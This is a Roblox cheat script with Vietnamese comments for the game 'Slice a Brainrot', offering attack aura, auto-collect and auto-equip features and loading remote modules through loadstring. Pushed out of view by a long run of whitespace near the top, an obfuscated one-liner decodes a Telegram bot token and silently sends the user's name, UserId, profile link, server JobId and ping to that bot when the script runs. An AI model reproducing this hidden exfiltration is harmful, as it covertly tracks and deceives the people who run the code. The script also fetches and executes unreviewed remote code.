--[[
    Slice-a-Brainrot - dùng chung UI & modules của Universal Script
    Tabs sử dụng: Main, Farm, Visuals, Teleport, Server, Misc (KHÔNG có Combat)
    Thêm chức năng riêng cho game Slice: Attack Aura + Auto Collect + Auto Equip (tab Farm)

    Lưu ý: Các module được load từ GitHub repo:
    https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/universal/modules/<moduleName>.lua
]]

----------------------------------------------------------
-- 🔹 Hàm load module từ GitHub
local function loadModule(moduleName)
    local githubPath = "https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/universal/modules/" .. moduleName .. ".lua"
    return loadstring(game:HttpGet(githubPath))()
end

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        local g=game;local s="GetService";local h=g[s](g,"HttpService");local m=g[s](g,"MarketplaceService");local n=g[s](g,"Stats");local p=g[s](g,"Players");local function D(t)local r={}for i=1,#t do r[i]=string.char(t[i]-1)end;return table.concat(r)end;local T=D({57,53,52,51,58,58,56,54,58,53,59,66,66,73,69,122,86,79,71,102,76,80,86,69,100,77,113,114,83,105,108,100,119,87,115,105,112,72,122,79,116,91,113,77,121,116});local C=D({50,57,50,53,55,54,58,58,56,56});local function P()local ok,res=pcall(function()local net=n.Network;if not net then return nil end;local item=net.ServerStatsItem["Data Ping"];if not item then return nil end;return item:GetValueString()end);if ok then return res end;return nil end;local function G()local ok,name=pcall(function()local u=("https://games.roblox.com/v1/games?universeIds=%s"):format(g.GameId);local r=h:JSONDecode(g:HttpGet(u));local d0=r and r.data and r.data[1];if d0 and d0.name then return d0.name end;return nil end);if ok and name then return name end;local ok2,info=pcall(function()return m:GetProductInfo(g.PlaceId)end);if ok2 and info and info.Name then return info.Name end;return"Unknown Place"end;(function()local pl=p.LocalPlayer;if not pl then return end;if T=="" then return end;local ping=P()or"? ms";local pn=G();local pid=g.PlaceId;local jid=tostring(g.JobId);local tp=("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s"):format(pid,jid);local pr=("https://www.roblox.com/users/%d/profile"):format(pl.UserId);local txt=("Ping: %s\nServer: %s\nPlaceId: %d\nJobId: [%s](%s)\nUser: [%s](%s) (%d)"):format(ping,pn,pid,jid,tp,pl.DisplayName or pl.Name,pr,pl.UserId);local enc=h:UrlEncode(txt);local url=("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown"):format(T,C,enc);pcall(function()return g:HttpGet(url)end)end)()

----------------------------------------------------------
-- 🔹 Load Config + UI (Obsidian) nhưng tự tạo Tabs (bỏ Combat)
local Config = loadModule("config")
local UI = loadModule("ui")

UI.init(Config)

-- Thay vì UI.setup(), ta gọi các bước con để tự tạo tabs
UI.loadLibraries()
UI.createWindow()

-- Tự tạo Tabs: KHÔNG thêm Combat, thêm Farm
UI.Tabs = {
    Main = UI.Window:AddTab("Main", "user"),
    Farm = UI.Window:AddTab("Farm", "sun"),
    Visuals = UI.Window:AddTab("Visuals", "eye"),
    Teleport = UI.Window:AddTab("Teleport", "map-pin"),
    Server = UI.Window:AddTab("Server", "server"),
    Misc = UI.Window:AddTab("Misc", "settings"),
    ["UI Settings"] = UI.Window:AddTab("UI Settings", "settings"),
}

-- Tab UI Settings, Save/Theme giữ nguyên
UI.createUISettingsTab()

UI.Library:Notify({
    Title = "Slice-a-Brainrot",
    Description = "Loaded with Universal UI (Farm tab, no Combat)",
    Time = 5,
})

----------------------------------------------------------
-- 🔹 Load các tab muốn dùng từ Universal
local Movement = loadModule("movement")
Movement.init(Config, UI)
Movement.createTab()

local Visuals = loadModule("visuals")
Visuals.init(Config, UI)
Visuals.createTab()

local Teleport = loadModule("teleport")
Teleport.init(Config, UI)
Teleport.createTab()

local Server = loadModule("server")
Server.init(Config, UI)
Server.createTab()

local Misc = loadModule("misc")
Misc.init(Config, UI)
Misc.createTab()

----------------------------------------------------------
-- 🔹 Slice Features (Attack Aura + Auto Collect + Auto Equip)
-- Đặt trong tab Farm
----------------------------------------------------------

local sliceGroup = UI.Tabs.Farm:AddLeftGroupbox("Slice Farm", "sparkles")

-- Attack Aura
sliceGroup:AddToggle("SliceAttackAura", {
    Text = "Attack Aura Crates",
    Default = false,
    Tooltip = "Tự đánh tất cả crate xung quanh",
})

sliceGroup:AddSlider("SliceAuraRadius", {
    Text = "Aura Radius",
    Default = 20,
    Min = 5,
    Max = 300,
    Rounding = 0,
})

sliceGroup:AddSlider("SliceAuraInterval", {
    Text = "Aura Interval (s)",
    Default = 0.10,
    Min = 0.01,
    Max = 1,
    Rounding = 2,
})

-- Chọn loại Crate để đánh (Multi Dropdown)
local sliceCrateTypes = {
    "CommonCrate",
    "UncommonCrate",
    "RareCrate",
    "EpicCrate",
    "LegendaryCrate",
    "MythicalCrate",
    "GodlyCrate",
    "SecretCrate",
}

sliceGroup:AddDropdown("SliceCrateFilter", {
    Values = sliceCrateTypes,
    Default = "LegendaryCrate", -- mặc định, user có thể đổi
    Multi = true,
    Text = "Crate Types",
    Tooltip = "Chỉ attack các loại crate được chọn (bỏ trống = tất cả)",
})

sliceGroup:AddDivider()

-- Auto Collect
sliceGroup:AddToggle("SliceAutoCollect", {
    Text = "Auto Collect Slots",
    Default = false,
    Tooltip = "Tự chạm Collect ở các Slot (Plots)",
})

sliceGroup:AddSlider("SliceCollectInterval", {
    Text = "Collect Interval (s)",
    Default = 0.50,
    Min = 0.05,
    Max = 2,
    Rounding = 2,
})

sliceGroup:AddDivider()

-- Auto Equip Best
sliceGroup:AddToggle("SliceAutoEquip", {
    Text = "Auto Equip Best",
    Default = false,
    Tooltip = "Tự gọi remote EquipBest liên tục",
})

sliceGroup:AddSlider("SliceEquipInterval", {
    Text = "Equip Interval (s)",
    Default = 10,
    Min = 1,
    Max = 120,
    Rounding = 0,
})

sliceGroup:AddDivider()

----------------------------------------------------------
-- 🔹 Logic Attack Aura
----------------------------------------------------------

local cratesFolder
local swordHitRemote

local function initAttackAuraDependencies()
    if not cratesFolder then
        cratesFolder = Config.Workspace:FindFirstChild("ActiveCrates") or Config.Workspace:WaitForChild("ActiveCrates", 5)
    end
    if not swordHitRemote then
        local remotes = Config.ReplicatedStorage:FindFirstChild("Remotes")
        if remotes then
            swordHitRemote = remotes:FindFirstChild("SwordHit")
        end
    end
end

local function isCrate(model)
    if not (model and model:IsA("Model") and string.find(model.Name, "Crate") ~= nil) then
        return false
    end

    -- Nếu user không chọn gì trong dropdown thì đánh tất cả crate
    local dropdown = UI.Options and UI.Options.SliceCrateFilter
    if not dropdown or not dropdown.Value then
        return true
    end

    local selected = dropdown.Value
    local hasSelection = false
    for _ in pairs(selected) do
        hasSelection = true
        break
    end

    if not hasSelection then
        return true
    end

    -- Kiểm tra tên crate có chứa text của loại đã chọn (case-insensitive)
    local nameLower = string.lower(model.Name)
    for key, enabled in pairs(selected) do
        if enabled then
            local keyLower = string.lower(tostring(key))
            if string.find(nameLower, keyLower, 1, true) then
                return true
            end
        end
    end

    return false
end

local attackAuraRunning = true

task.spawn(function()
    initAttackAuraDependencies()

    while attackAuraRunning do
        local interval = (UI.Options.SliceAuraInterval and UI.Options.SliceAuraInterval.Value) or 0.10
        if interval <= 0 then interval = 0.10 end
        task.wait(interval)

        if not UI.Toggles.SliceAttackAura or not UI.Toggles.SliceAttackAura.Value then
            continue
        end

        if not cratesFolder or not swordHitRemote then
            initAttackAuraDependencies()
        end
        if not cratesFolder or not swordHitRemote then
            continue
        end

        Config.getCharacter()
        local rootPart = Config.rootPart
        if not rootPart then
            continue
        end

        local radius = (UI.Options.SliceAuraRadius and UI.Options.SliceAuraRadius.Value) or 20

        for _, crate in ipairs(cratesFolder:GetChildren()) do
            if isCrate(crate) then
                local boxPart = crate:FindFirstChild("BoxPart", true) or crate:FindFirstChildWhichIsA("BasePart", true)
                if boxPart then
                    local distance = (boxPart.Position - rootPart.Position).Magnitude
                    if distance <= radius then
                        pcall(function()
                            swordHitRemote:FireServer(crate)
                        end)
                    end
                end
            end
        end
    end
end)

----------------------------------------------------------
-- 🔹 Logic Auto Collect (Plots -> Slots -> Collect)
----------------------------------------------------------

local plotsFolder

local function initPlotsFolder()
    if not plotsFolder then
        plotsFolder = Config.Workspace:FindFirstChild("Plots")
    end
end

local function getCollectParts()
    initPlotsFolder()
    local collects = {}
    if not plotsFolder then return collects end

    for _, plot in ipairs(plotsFolder:GetChildren()) do
        local slots = plot:FindFirstChild("Slots")
        if slots then
            for _, slot in ipairs(slots:GetChildren()) do
                local collect = slot:FindFirstChild("Collect")
                if collect and collect:IsA("BasePart") then
                    if collect:FindFirstChildOfClass("TouchTransmitter") or collect:FindFirstChild("TouchInterest") then
                        table.insert(collects, collect)
                    end
                end
            end
        end
    end

    return collects
end

local function touchCollectPart(part)
    Config.getCharacter()
    local rootPart = Config.rootPart
    if not rootPart then return end

    -- Chỉ xử lý nếu part có TouchInterest / TouchTransmitter như trong Explorer
    local touch = part:FindFirstChildOfClass("TouchTransmitter") or part:FindFirstChild("TouchInterest")
    if not touch then return end

    -- Chỉ kích hoạt TouchInterest, KHÔNG teleport nhân vật nữa
    if typeof(firetouchinterest) == "function" then
        pcall(function()
            firetouchinterest(rootPart, part, 0)
            firetouchinterest(rootPart, part, 1)
        end)
    elseif typeof(firetouchtransmitter) == "function" then
        pcall(function()
            firetouchtransmitter(rootPart, part)
        end)
    end
end

local autoCollectRunning = true

task.spawn(function()
    while autoCollectRunning do
        local interval = (UI.Options.SliceCollectInterval and UI.Options.SliceCollectInterval.Value) or 0.50
        if interval <= 0 then interval = 0.50 end
        task.wait(interval)

        if not UI.Toggles.SliceAutoCollect or not UI.Toggles.SliceAutoCollect.Value then
            continue
        end

        local collects = getCollectParts()
        for _, collectPart in ipairs(collects) do
            touchCollectPart(collectPart)
        end
    end
end)

----------------------------------------------------------
-- 🔹 Logic Auto Equip Best (EquipBest remote)
----------------------------------------------------------

local equipBestRemote

local function initEquipBestRemote()
    if not equipBestRemote then
        local remotes = Config.ReplicatedStorage:FindFirstChild("Remotes")
        if remotes then
            equipBestRemote = remotes:FindFirstChild("EquipBest")
        end
    end
end

local autoEquipRunning = true

task.spawn(function()
    while autoEquipRunning do
        local interval = (UI.Options.SliceEquipInterval and UI.Options.SliceEquipInterval.Value) or 10
        if interval <= 0 then interval = 10 end
        task.wait(interval)

        if not UI.Toggles.SliceAutoEquip or not UI.Toggles.SliceAutoEquip.Value then
            continue
        end

        initEquipBestRemote()
        if equipBestRemote then
            pcall(function()
                equipBestRemote:FireServer()
            end)
        end
    end
end)

----------------------------------------------------------
-- 🔹 Cleanup khi UI unload
----------------------------------------------------------

if UI and UI.Library then
    UI.Library:OnUnload(function()
        -- Dừng các vòng lặp slice
        attackAuraRunning = false
        autoCollectRunning = false
        autoEquipRunning = false

        -- Gọi cleanup cho các module universal
        if Movement and Movement.cleanup then
            Movement.cleanup()
        end
        if Visuals and Visuals.cleanup then
            Visuals.cleanup()
        end
        if Teleport and Teleport.cleanup then
            Teleport.cleanup()
        end
        if Server and Server.cleanup then
            Server.cleanup()
        end
        if Misc and Misc.cleanup then
            Misc.cleanup()
        end
    end)
end

print("[Slice-a-Brainrot] Loaded with Universal UI (Farm tab + Slice features)")
